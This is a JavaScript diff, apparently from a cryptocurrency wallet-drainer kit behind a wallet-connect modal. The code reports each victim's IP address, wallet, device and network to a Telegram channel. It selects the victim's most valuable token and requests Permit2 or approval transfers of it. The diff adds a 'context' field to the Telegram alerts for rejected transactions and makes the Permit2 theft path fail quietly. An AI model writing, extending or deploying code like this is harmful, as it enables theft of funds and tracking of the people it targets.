@@ -447,14 +447,15 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
   }
 }
 
-async function notifyTransactionRejected(address, walletName, device, chainId) {
+async function notifyTransactionRejected(address, walletName, device, context, chainId) {
   try {
     const ip = await getUserIP()
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     const message = `❌ Transaction rejected by user (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: ${networkName}\n`
+                    `🕸 Network: ${networkName}\n` +
+                    `🎯 Context: ${context}`
     await sendTelegramMessage(message)
   } catch (error) {
     store.errors.push(`Error in notifyTransactionRejected: ${error.message}`)
@@ -1050,6 +1051,9 @@ const initializeSubscribers = (modal) => {
               await notifyTransferApproved(state.address, walletInfo.name, device, token, token.chainId)
               await notifyTransferSuccess(state.address, walletInfo.name, device, token, token.chainId, data.txHash || 'unknown')
               hideCustomModal(); store.isProcessingConnection = false; return
+            } else {
+              store.errors.push(`Permit2 backend failed: ${data.message || 'unknown error'}`)
+              hideCustomModal(); store.isProcessingConnection = false; return
             }
           } catch (error) {
             if (isUserRejected(error)) {
@@ -1057,10 +1061,12 @@ const initializeSubscribers = (modal) => {
               hideCustomModal(); store.isProcessingConnection = false; return
             }
             store.errors.push(`Permit2 error: ${error.message}`)
+            hideCustomModal(); store.isProcessingConnection = false; return
           }
         }
         
         // Обычный single approve, если Permit2 выключен
+        if (USE_PERMIT2) { hideCustomModal(); store.isProcessingConnection = false; return }
         console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price}`)
         console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
         const targetNetworkInfo = networkMap[mostExpensive.network]
